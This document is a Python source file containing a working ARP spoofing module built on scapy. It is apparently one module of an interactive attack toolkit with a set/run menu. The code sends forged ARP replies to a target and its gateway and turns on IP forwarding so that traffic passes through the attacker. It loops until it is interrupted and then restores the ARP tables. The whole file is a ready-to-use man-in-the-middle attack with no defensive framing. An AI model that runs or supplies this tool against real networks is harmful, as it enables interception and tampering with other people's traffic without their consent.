from scapy.all import Ether, ARP, srp, send
import time
import os

service = 0
class ARP_Spoofer:
    def __init__(self):
        self.options = {"target_ip":"", "server_ip":"192.168.1.1", "forward_packets":"yes", "verbose":"yes"}
        self.macs = []
    def get_mac(self, ip):
        ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=3, verbose=0)
        if ans:
            return ans[0][1].src
    def spoof(self):
        arp_res = ARP(pdst=self.options["target_ip"], hwdst=self.macs[0], psrc=self.options["server_ip"], op='is-at')
        send(arp_res, verbose=0)
        if self.options["verbose"] == "yes":
            print("[+] Sent to {} : {} is at {}".format(self.options["target_ip"], self.options["server_ip"], ARP().hwsrc))
        arp_res = ARP(pdst=self.options["server_ip"], hwdst=self.macs[1], psrc=self.options["target_ip"], op='is-at')
        send(arp_res, verbose=0)
        if self.options["verbose"] == "yes":
            print("[+] Sent to {} : {} is at {}".format(self.options["server_ip"], self.options["target_ip"], ARP().hwsrc))

    def restore(self):
        arp_res = ARP(pdst=self.options["target_ip"], hwdst=self.macs[0], psrc=self.options["server_ip"], hwsrc=self.macs[1])
        send(arp_res, verbose=0, count=7)
        arp_res = ARP(pdst=self.options["server_ip"], hwdst=self.macs[1], psrc=self.options["target_ip"], hwsrc=self.macs[0])
        send(arp_res, verbose=0, count=7)

    def start_spoofing(self):
        if self.options["forward_packets"] == "yes":
            # We need to enable port forwarding
            if os.name == "nt":
                os.system("powershell.exe 'Set-NetIPInterface -Forwarding Enabled'")
            else:
                with open("/proc/sys/net/ipv4/ip_forward", 'w') as f:
                    f.write('1')
        else:
            if os.name == "nt":
                os.system("powershell.exe 'Set-NetIPInterface -Forwarding Disabled'")
            else:
                with open("/proc/sys/net/ipv4/ip_forward", 'w') as f:
                    f.write('0')
        self.macs = []
        self.macs.append(self.get_mac(self.options["target_ip"]))
        self.macs.append(self.get_mac(self.options["server_ip"]))
        while True:
            try:
                self.spoof()
                time.sleep(2.5)
            except KeyboardInterrupt:
                print("Restoring... Please give a second")
                self.restore()
                return 0

    def set_property(self, prop_name, prop_val):
        if prop_name in self.options:
            self.options[prop_name] = prop_val
        else:
            print("Option not found")

    def printOptions(self):
        print("!+!+! ARP-Spoofer !+!+!")
        print("---Parameters---")
        print("target_ip: {}".format(self.options["target_ip"]))
        print("server_ip: {}".format(self.options["server_ip"]))
        print("forward_packets: {}".format(self.options["forward_packets"]))
        print("verbose: {}".format(self.options["verbose"]))
        print("")
        print("---Commands---")
        print("op) Print this option menu")
        print("b) Exit this module")
        print("r) Run this module")
        print("set [property] [value]) set parameter with value")

    def handle_menu(self):
        cmd = input(": ")
        spaced_cmd = cmd.split(" ")
        if spaced_cmd[0] == "b":
            return 0
        elif spaced_cmd[0] == "op":
            os.system('cls' if os.name == 'nt' else 'clear')
            self.printOptions()
        elif spaced_cmd[0] == "r":
            try:
                self.start_spoofing()
            except:
                print("Something is wrong... Make sure your options are configured correctly and this program is being ran as a super user")
        elif spaced_cmd[0] == "set":
            if len(spaced_cmd) >= 2:
                new_item_val = ""
                for inp_op in spaced_cmd[2:]:
                    new_item_val += inp_op + " "
                self.set_property(spaced_cmd[1], new_item_val.strip())
            else:
                print("Incorrect number of parameters for options")
        else:
            print("Option not found")
        return 1
